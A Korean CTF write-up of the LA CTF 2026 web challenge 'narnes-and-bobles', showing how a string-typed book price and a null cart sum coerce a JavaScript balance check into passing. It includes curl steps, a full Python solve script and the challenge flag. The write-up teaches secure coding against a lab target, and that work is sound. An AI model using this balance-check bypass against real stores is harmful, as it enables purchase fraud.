---
title: "[Web] narnes-and-bobles"
description: Writeup for "narnes-and-bobles" from LA CTF 2026.
date: 2026-02-10 01:00:00 +0900
categories: [CTF, LA CTF 2026]
tags: [Web]
toc: true
comments: false
---

# narnes-and-bobles (LA CTF 2026)

---

- **Name:** narnes-and-bobles
- **Category:** Web
- **Connection:** `https://...instancer.lac.tf`
- **Flag format:** `lactf{...}`

---

### 개요

온라인 서점입니다.
회원가입 후 책을 장바구니에 담고, 결제하면 구매한 책을 ZIP으로 내려받을 수 있습니다.

플래그 책의 가격은 **1,000,000**이지만,
시작 잔액은 **1,000**밖에 없어서 정상 구매는 불가능합니다.

목표는 **잔액 검증을 우회**해서 `flag.txt`가 담긴 ZIP을 받는 것입니다.

주요 엔드포인트는 이렇습니다.

| 엔드포인트 | 설명 |
|---|---|
| `POST /register/` | 회원가입 |
| `POST /login/` | 로그인 |
| `GET /cart` | 장바구니 및 잔액 확인 |
| `POST /cart/add` | 장바구니 추가 **(잔액 검사 여기서 발생)** |
| `POST /cart/checkout` | 결제 및 ZIP 다운로드 |

잔액 검사는 `/cart/add`에서만 이루어집니다.
여기서 뚫리면 checkout은 그냥 통과합니다.

---

### 소스 분석

#### books.json — 가격 타입 확인

책 데이터 파일을 열어보면 뭔가 이상한 항목이 보입니다.

```json
[
  { "id": "a3e33c2505a19d18", "title": "part-time-parliament", "price": "10" },
  { "id": "2a16e349fb9045fa", "title": "flag",                  "price": 1000000 }
]
```

대부분의 책은 `price`가 숫자인데,
`part-time-parliament`만 `"10"` — **문자열**입니다.

JavaScript에서 숫자와 문자열을 `+`로 더하면 어떻게 될까요?

```js
0 + "10"      // → "010"  (문자열 연결!)
"010" + 1000000  // → "0101000000"  (여전히 문자열)
"0101000000" > 1000  // → false  (문자열과 숫자 비교: 특이하게 동작)
```

이 타입 불일치가 잔액 검사를 망가뜨릴 수 있습니다.

#### /cart/add — 잔액 검사 로직

`additionalSum`을 계산하는 부분을 봅니다.

```js
additionalSum = productsToAdd
  .filter(p => !p.is_sample)
  .map(p => booksLookup.get(p.book_id).price)
  .reduce((l, r) => l + r, 0)
```

초기값 `0`(숫자)에서 시작해서 각 책의 `price`를 누적합니다.
`"10"` (문자열)이 끼어들면:

```js
0 + "10"         // → "010"
"010" + 1000000  // → "0101000000"
```

`additionalSum`이 숫자가 아닌 **문자열**이 됩니다.

여기에 `cartSum`까지 더해집니다.

```js
if (additionalSum + cartSum > balance) {
  return res.status(400).json({ err: "Insufficient balance" });
}
```

장바구니가 비어 있으면 DB의 `SUM()`은 `null`을 반환합니다.

```js
"0101000000" + null  // → "0101000000null"
"0101000000null" > 1000  // → false  ← 검사 통과!
```

문자열이 된 `additionalSum`에 `null`이 더해져 `"...null"` 형태의 문자열이 되고,
`> 1000` 비교가 `false`를 반환해 잔액 부족 에러 없이 통과됩니다.

---

### 취약점 분석

세 가지 조건이 맞물립니다.

**1. `books.json`의 타입 불일치:**
`part-time-parliament`의 `price`가 문자열 `"10"`입니다.

**2. JavaScript의 `+` 연산자 타입 강제 변환:**
숫자 `+` 문자열은 덧셈이 아닌 문자열 연결이 됩니다.
`additionalSum` 전체가 문자열로 오염됩니다.

**3. 빈 장바구니에서 `SUM()`이 `null` 반환:**
`cartSum = null`이 더해지면서 `"...null"` 문자열이 완성되고,
`> balance` 비교가 `false`가 되어 검사를 통과합니다.

이 세 조건을 동시에 만족시키면 됩니다.
장바구니를 비운 상태에서, 문자열 가격 책과 플래그 책을 **한 번에** 담으면 끝입니다.

---

### Exploit 실행 과정

**Step 1 — 회원가입 및 로그인**

```bash
export BASE="https://...instancer.lac.tf"

# 회원가입
curl -s -c cookies.txt \
  -X POST "$BASE/register/" \
  -d "username=test&password=test"

# 로그인
curl -s -c cookies.txt -b cookies.txt \
  -X POST "$BASE/login/" \
  -d "username=test&password=test"
```

**Step 2 — 빈 장바구니 확인**

```bash
curl -s -b cookies.txt "$BASE/cart"
# 예상: {"cart":[],"balance":1000}
```

장바구니가 비어 있어야 `cartSum = null` 조건이 만족됩니다.

**Step 3 — 문자열 가격 책 + 플래그 책 한 번에 추가**

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST "$BASE/cart/add" \
  -H "Content-Type: application/json" \
  --data-binary '{
    "products": [
      {"book_id": "a3e33c2505a19d18", "is_sample": 0},
      {"book_id": "2a16e349fb9045fa", "is_sample": 0}
    ]
  }'
```

성공하면 `remainingBalance`가 이상한 값(음수 또는 문자열)으로 오지만,
에러 없이 응답이 옵니다.

**Step 4 — 결제 및 플래그 추출**

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST "$BASE/cart/checkout" \
  -o order.zip

unzip -p order.zip flag.txt
```

실행 결과:

```
lactf{matcha_dubai_chocolate_labubu}
```

---

### Exploit 코드 (Python)

```python
#!/usr/bin/env python3
import argparse, io, random, re, string, sys, zipfile
from urllib.parse import urljoin
import requests

FLAG_RE = re.compile(r"lactf\{[^}]+\}")

# part-time-parliament: price = "10" (문자열) → 타입 오염 유발
STRING_PRICE_BOOK_ID = "a3e33c2505a19d18"
# flag: price = 1000000
FLAG_BOOK_ID = "2a16e349fb9045fa"

def rand_str(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="예: https://...instancer.lac.tf")
    ap.add_argument("--user", default=None)
    ap.add_argument("--pw",   default=None)
    args = ap.parse_args()

    base = args.base.rstrip("/") + "/"
    s = requests.Session()
    username = args.user or f"u_{rand_str(12)}"
    password = args.pw   or f"p_{rand_str(16)}"

    # 1) 회원가입
    s.post(urljoin(base, "register/"),
           data={"username": username, "password": password},
           allow_redirects=False, timeout=15)

    # 2) 로그인
    s.post(urljoin(base, "login/"),
           data={"username": username, "password": password},
           allow_redirects=False, timeout=15)

    # 3) 문자열 가격 책 + 플래그 책 동시 추가 (빈 장바구니 상태)
    r = s.post(urljoin(base, "cart/add"),
               json={"products": [
                   {"book_id": STRING_PRICE_BOOK_ID, "is_sample": 0},
                   {"book_id": FLAG_BOOK_ID,         "is_sample": 0},
               ]}, timeout=15)
    r.raise_for_status()
    j = r.json()
    if "err" in j:
        sys.exit(f"[!] /cart/add 오류: {j['err']}")
    print("[+] 장바구니 추가 성공")

    # 4) 결제
    r = s.post(urljoin(base, "cart/checkout"), timeout=30)
    r.raise_for_status()

    # 5) ZIP에서 플래그 추출
    try:
        zf = zipfile.ZipFile(io.BytesIO(r.content))
    except zipfile.BadZipFile:
        sys.exit("[!] 응답이 유효한 ZIP 파일이 아닙니다")

    if "flag.txt" not in zf.namelist():
        sys.exit(f"[!] ZIP에 flag.txt 없음. 파일 목록: {zf.namelist()}")

    flag_txt = zf.read("flag.txt").decode("utf-8", errors="replace")
    m = FLAG_RE.search(flag_txt)
    print(f"[+] FLAG: {m.group(0)}" if m else "[!] 플래그 패턴을 찾지 못했습니다")

if __name__ == "__main__":
    main()
```

**실행 방법:**

```bash
python3 solve.py --base "https://...instancer.lac.tf"
```

---

### FLAG

```
lactf{matcha_dubai_chocolate_labubu}
```

---

### 요약

이 문제의 핵심은 **JavaScript의 `+` 연산자가 타입에 따라 다르게 동작한다**는 점입니다.

`books.json`에 딱 하나 문자열로 저장된 가격 `"10"`이,
`reduce`를 통해 누적되는 순간 `additionalSum` 전체를 문자열로 오염시킵니다.

여기에 빈 장바구니에서 `SUM()`이 `null`을 반환하는 조건까지 겹치면,
`additionalSum + cartSum > balance`가 문자열 비교가 되어 검증을 통과합니다.

데이터 파일 하나의 타입 실수가
서버의 잔액 검증 전체를 무력화시키는 결과로 이어졌습니다.

숫자를 다루는 데이터는 반드시 타입을 명시적으로 검증하고,
연산 전에 `Number()` 또는 `parseInt()`로 강제 변환하는 습관이 필요합니다.
